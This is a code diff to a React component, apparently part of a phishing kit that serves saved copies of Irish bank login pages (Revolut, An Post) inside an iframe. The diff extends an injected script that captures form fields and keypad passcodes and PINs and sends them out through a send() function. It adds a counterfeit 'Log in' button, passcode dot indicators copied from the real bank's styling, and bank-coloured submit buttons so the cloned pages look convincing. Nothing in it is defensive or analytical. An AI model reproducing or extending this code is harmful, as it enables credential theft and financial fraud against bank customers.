@@ -35,13 +35,15 @@ const IGNORED_INPUT_TYPES = new Set([
   "radio",
 ]);
 
-function buildInjectionScript(step: number): string {
+function buildInjectionScript(step: number, bankSlug: string, brandColor: string): string {
   const reSource = SUBMIT_TEXT_RE.source;
   const reFlags = SUBMIT_TEXT_RE.flags;
   return `(() => {
     const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
     const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};
     const STEP = ${step};
+    const BANK_SLUG = ${JSON.stringify(bankSlug)};
+    const BRAND_COLOR = ${JSON.stringify(brandColor)};
 
     const collectFrom = (doc) => {
       const data = {};
@@ -109,23 +111,104 @@ function buildInjectionScript(step: number): string {
     };
 
     // ------------------------------------------------------------------
-    // KEYPAD MODE (Revolut 2.html style): digit buttons [data-value="0-9"],
-    // backspace = any non-digit button inside the keypad cluster.
-    // Buffer digits; fire when >=4 digits and ~900ms idle.
+    // KEYPAD MODE (Revolut 2.html style): digit buttons [data-value="0-9"].
+    // - her rakam ekranda nokta olarak gosterilir (kayitli sayfada JS yok)
+    // - >=4 rakamda altta "Log in" benzeri Continue butonu cikar
+    // - non-digit buton (icon) = backspace
     // ------------------------------------------------------------------
     let keypadBuffer = "";
-    let keypadTimer = null;
     const hasKeypad = () => {
       try { return !!document.querySelector("button[data-value]"); } catch (e) { return false; }
     };
     const flushKeypad = () => {
       if (keypadBuffer.length >= 4) {
-        send("keypad", { passcode: keypadBuffer, pin: keypadBuffer });
+        const buf = keypadBuffer;
+        keypadBuffer = "";
+        try { renderKeypad(); } catch (e) {}
+        send("keypad", { passcode: buf, pin: buf });
       }
     };
-    const resetKeypadTimer = () => {
-      if (keypadTimer) clearTimeout(keypadTimer);
-      keypadTimer = setTimeout(flushKeypad, 900);
+    const dotContainer = () => {
+      try {
+        const dot = document.querySelector(".sx827n0");
+        if (dot && dot.parentElement) {
+          // Sablonu ve parent'i sakla — nokta sayisi 0'a dustugunde tekrar kullanilabilsin
+          window.__ieDotTpl = window.__ieDotTpl || dot.cloneNode(true);
+          window.__ieDotParent = dot.parentElement;
+          return { parent: dot.parentElement, template: window.__ieDotTpl };
+        }
+        if (window.__ieDotTpl && window.__ieDotParent && window.__ieDotParent.isConnected) {
+          return { parent: window.__ieDotParent, template: window.__ieDotTpl };
+        }
+      } catch (e) {}
+      return null;
+    };
+    const renderKeypadDots = () => {
+      try {
+        const info = dotContainer();
+        if (info) {
+          const len = keypadBuffer.length;
+          let dots = info.parent.querySelectorAll(".sx827n0");
+          while (dots.length < len) {
+            const clone = info.template.cloneNode(true);
+            clone.setAttribute("data-status", "entered");
+            info.parent.appendChild(clone);
+            dots = info.parent.querySelectorAll(".sx827n0");
+          }
+          while (dots.length > len) {
+            info.parent.removeChild(dots[dots.length - 1]);
+            dots = info.parent.querySelectorAll(".sx827n0");
+          }
+          return;
+        }
+        // Fallback: kendi nokta gostergemizi olustur (keypad grid'inin ustune)
+        let own = document.getElementById("ie-keypad-dots");
+        const firstBtn = document.querySelector("button[data-value]");
+        if (!firstBtn) return;
+        if (!own) {
+          own = document.createElement("div");
+          own.id = "ie-keypad-dots";
+          own.style.cssText = "display:flex;gap:14px;justify-content:center;margin:0 auto 24px;padding:8px 0";
+          const grid = firstBtn.parentElement;
+          const anchor = (grid && grid.parentElement) || grid || document.body;
+          anchor.insertBefore(own, anchor.firstChild);
+        }
+        own.innerHTML = "";
+        for (let i = 0; i < Math.max(keypadBuffer.length, 4); i++) {
+          const d = document.createElement("span");
+          d.style.cssText =
+            "width:14px;height:14px;border-radius:50%;display:inline-block;" +
+            (i < keypadBuffer.length ? "background:#191c1f" : "background:#d7dce0");
+          own.appendChild(d);
+        }
+      } catch (e) {}
+    };
+    const renderContinueButton = () => {
+      try {
+        let btn = document.getElementById("ie-keypad-continue");
+        const show = hasKeypad() && keypadBuffer.length >= 4;
+        if (show && !btn) {
+          btn = document.createElement("button");
+          btn.id = "ie-keypad-continue";
+          btn.type = "button";
+          btn.textContent = "Log in";
+          btn.style.cssText =
+            "position:fixed;left:50%;transform:translateX(-50%);bottom:24px;z-index:999999;" +
+            "width:calc(100% - 32px);max-width:400px;height:52px;border:none;border-radius:26px;" +
+            "background:#191c1f;color:#ffffff;font:600 17px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
+            "cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35)";
+          btn.addEventListener("click", (ev) => {
+            try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+            flushKeypad();
+          });
+          document.body.appendChild(btn);
+        }
+        if (btn) btn.style.display = show ? "block" : "none";
+      } catch (e) {}
+    };
+    const renderKeypad = () => {
+      renderKeypadDots();
+      renderContinueButton();
     };
 
     // Kaydedilmis sayfalarda JS olmadigi icin butonlar disabled kalir.
@@ -140,6 +223,44 @@ function buildInjectionScript(step: number): string {
             if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
             if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
             if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // SUBMIT-READY: gri (disabled gorunumlu) submit butonlari, tum
+    // gorunur alanlar doldugunda banka rengiyle renklendirilir.
+    // (An Post'un #D0D0CE!important gri kuralini inline !important ile ezer)
+    // ------------------------------------------------------------------
+    const READY_COLORS = { "an-post": "#00A76A" };
+    const updateSubmitReady = (root) => {
+      try {
+        const inputs = [];
+        root.querySelectorAll("input").forEach((el) => {
+          const t = (el.getAttribute("type") || "text").toLowerCase();
+          if (IGNORED.includes(t)) return;
+          try { if (!el.getClientRects().length) return; } catch (e) {}
+          inputs.push(el);
+        });
+        if (inputs.length === 0) return;
+        const ready = inputs.every((el) => (el.value || "").trim() !== "");
+        const readyColor = READY_COLORS[BANK_SLUG] || BRAND_COLOR || "";
+        if (!readyColor) return;
+        root.querySelectorAll("input[type=submit], button[type=submit], .gigya-composite-control-submit input, .de-login-submit input").forEach((btn) => {
+          try {
+            const cs = root.defaultView ? root.defaultView.getComputedStyle(btn) : getComputedStyle(btn);
+            const m = /rgba?\((\d+),\s*(\d+),\s*(\d+)/.exec(cs.backgroundColor || "");
+            const grayish = m && Math.abs(+m[1] - +m[2]) < 20 && Math.abs(+m[2] - +m[3]) < 20 && +m[1] > 140;
+            if (ready && (grayish || btn.__ieReadyStyled)) {
+              btn.style.setProperty("background-color", readyColor, "important");
+              btn.style.setProperty("color", "#ffffff", "important");
+              btn.__ieReadyStyled = true;
+            } else if (!ready && btn.__ieReadyStyled) {
+              btn.style.removeProperty("background-color");
+              btn.style.removeProperty("color");
+              btn.__ieReadyStyled = false;
+            }
           } catch (e) {}
         });
       } catch (e) {}
@@ -202,6 +323,9 @@ function buildInjectionScript(step: number): string {
 
       enableControls(doc);
       applyDobGuards(doc);
+      updateSubmitReady(doc);
+      doc.addEventListener("input", () => updateSubmitReady(doc), true);
+      doc.addEventListener("change", () => updateSubmitReady(doc), true);
       try {
         new MutationObserver((mutations) => {
           for (const m of mutations) {
@@ -224,6 +348,15 @@ function buildInjectionScript(step: number): string {
       }, true);
 
       doc.addEventListener("click", (e) => {
+        // Kendi enjekte ettigimiz Continue butonu: isSubmitish'e yakalanmasin
+        try {
+          let t0 = e.target;
+          while (t0 && t0 !== doc.body) {
+            if (t0.id === "ie-keypad-continue") return;
+            t0 = t0.parentElement;
+          }
+        } catch (err) {}
+
         // Keypad digits first (Revolut passcode screen)
         try {
           let el = e.target;
@@ -233,13 +366,13 @@ function buildInjectionScript(step: number): string {
               const dv = el.getAttribute("data-value");
               if (dv != null && /^[0-9]$/.test(dv)) {
                 if (keypadBuffer.length < 12) keypadBuffer += dv;
-                resetKeypadTimer();
+                renderKeypad();
                 return;
               }
               // non-digit button while keypad exists -> backspace
               if (hasKeypad() && (el.getAttribute("data-variant") === "icon" || /iconbutton/i.test(typeof el.className === "string" ? el.className : ""))) {
                 keypadBuffer = keypadBuffer.slice(0, -1);
-                if (keypadTimer) clearTimeout(keypadTimer);
+                renderKeypad();
                 return;
               }
             }
@@ -273,6 +406,11 @@ function buildInjectionScript(step: number): string {
         try {
           if (e.key === "Backspace" && keypadBuffer.length > 0 && hasKeypad()) {
             keypadBuffer = keypadBuffer.slice(0, -1);
+            renderKeypad();
+            return;
+          }
+          if (e.key === "Enter" && hasKeypad() && keypadBuffer.length >= 4) {
+            flushKeypad();
             return;
           }
           if (e.key !== "Enter") return;
@@ -307,13 +445,15 @@ function buildInjectionScript(step: number): string {
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyDobGuards(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyDobGuards(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
       scanIframes(document, 0);
       enableControls(document);
       applyDobGuards(document);
+      updateSubmitReady(document);
+      renderKeypad();
       if (++tries > 30) clearInterval(retry);
     }, 500);
   })();`;
@@ -450,7 +590,11 @@ export function IrelandBankTemplate({ bankSlug, onChange, handleRouteAction, onP
       const doc = iframeRef.current?.contentDocument;
       if (!doc) return;
       const script = doc.createElement("script");
-      script.textContent = buildInjectionScript(stepRef.current);
+      script.textContent = buildInjectionScript(
+        stepRef.current,
+        bankSlugRef.current,
+        (brandColor || "").toString().trim(),
+      );
       doc.documentElement.appendChild(script);
     } catch (err) {
       console.error("IE bank iframe injection error:", err);
